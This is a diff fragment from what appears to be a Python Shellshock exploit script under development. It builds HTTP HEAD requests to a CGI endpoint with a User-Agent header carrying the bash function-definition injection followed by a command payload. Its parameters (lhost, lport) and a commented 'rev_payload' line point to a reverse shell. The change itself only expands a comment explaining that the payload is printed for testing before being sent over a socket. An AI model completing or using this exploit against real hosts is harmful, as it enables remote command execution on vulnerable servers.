@@ -29,7 +29,7 @@ def shellshock_http_req(lhost, lport, rhost, rport, target_url):
        payloads_encoded = payloads.encode()
        #payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (payloads, rhost_encoded))
        #print(payloads)
-       # Need to send these bytes in a socket
+       # Need to send these bytes in a socket, for testing purposes they're being printed to show what will be redirected to the socket later 
        payload = print(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (payloads_encoded, rhost_encoded))
    #payload = print(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (rev_payload, rhost_encoded))
    # Payload needs to be added in accordance with the for loop of several payloads. A single variable of payload should be expected which should fulfil the conditions of all required parameters as part of the HEAD request and user agent modification   
